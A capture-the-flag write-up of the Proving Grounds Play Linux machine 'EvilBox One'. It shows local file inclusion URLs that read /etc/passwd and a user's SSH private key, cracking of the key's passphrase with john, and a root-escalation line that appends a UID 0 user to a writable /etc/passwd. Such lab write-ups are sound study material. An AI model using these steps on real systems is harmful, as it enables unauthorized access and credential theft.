---
title: "PG Play: EvilBox One"
created: "2023-09-02"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Play
machine: "EvilBox One"
os: Linux
status: rooted
tags:
  - - proving-grounds
  - pg-play
  - linux
  - ctf
  - oscp
  - local-file-inclusion-lfi
  - ssh-key-theft
  - hash-cracking-john
  - etcpasswd-manipulation
related:
  - "[[LFI-to-RCE-Log-Poisoning-Pattern]]"
  - "[[FTP-Exploitation-Techniques]]"
  - "[[Password-Cracking-Methodology]]"
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Play: EvilBox One

> **Platform:** Proving Grounds Play | **OS:** Linux | **Date:** 2023-09-02

---

## Quick Summary

**Open Ports:**
- 22/tcp (ssh)
- 80/tcp (http)

**Key Techniques:**
- Local File Inclusion (LFI)
- SSH Key Theft
- Hash Cracking (John)
- /etc/passwd Manipulation

**Privilege Escalation Path:**
- Writable /etc/passwd

---

## Full Walkthrough

Proving grounds Play - EvilBox-One CTF writeup.

## Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80 || Web


## Fuzzing

### Files


### Directory


Fuzz for files in `/secrets` directory.


**Found file evil.php**

http://192.168.152.212/secret/evil.php

## Fuzz for paramaters

http://192.168.152.212/secret/evil.php?FUZZ=/etc/passwd

Trying local file inclusion vulnerability to check the words retieved in the response to confirm the parameter.


http://192.168.152.212/secret/evil.php?command=/etc/passwd


As shown in the above `/etc/passwd` file we have a user `mowree`.

```sh
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
```

Using the LFI vulnerability we can obtain the SSH key for the user `mowree`.

http://192.168.152.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa


SSH to mowree using the SSH key.

Using id_rsa key to login to the `mowree` user account is prompted with password to continue. So use `ssh2john` to create hash for the SSH key and crack the same using john.


Extracted password `unicorn`

**Initial Foothold Obtained**


## Privilege Escalation

Check the permissions for `/etc/passwd`.

/etc/passwd is writable so we can create our own root user.

**Writing new user to /etc/passwd**

```sh
echo "hacker:bWBoOyE1sFaiQ:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Switch to user `hacker` and enter password `mypass` to obtain root.

---

## Technique Links

- [[LFI-to-RCE-Log-Poisoning-Pattern]]
- [[FTP-Exploitation-Techniques]]
- [[Password-Cracking-Methodology]]
- [[Linux-PrivEsc-Decision-Tree]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
